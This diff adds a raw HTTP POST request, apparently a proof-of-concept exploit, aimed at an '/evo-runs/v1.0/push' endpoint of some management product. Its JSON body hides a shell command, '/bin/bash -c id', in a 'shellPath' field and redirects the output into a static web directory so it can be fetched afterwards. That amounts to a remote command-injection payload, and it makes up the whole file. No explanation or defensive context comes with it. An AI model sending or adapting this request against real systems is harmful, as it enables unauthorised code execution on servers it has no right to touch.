@@ -1,0 +1,19 @@
+POST /evo-runs/v1.0/push HTTP/2
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+Content-Type: application/json
+X-Subject-Headerflag: ADAPT
+Content-Length: 301
+
+{   
+ "method": "agent.ossm.mapping.config",
+    "info": {
+        "configure": "cc", 
+        "filePath": "cc",
+        "paramMap": {
+            "shellPath": "/bin/bash -c id>/opt/evoWpms/static/cc.txt",
+            "filePath": "cc"
+        },
+        "requestIp": ""
+    }
+}
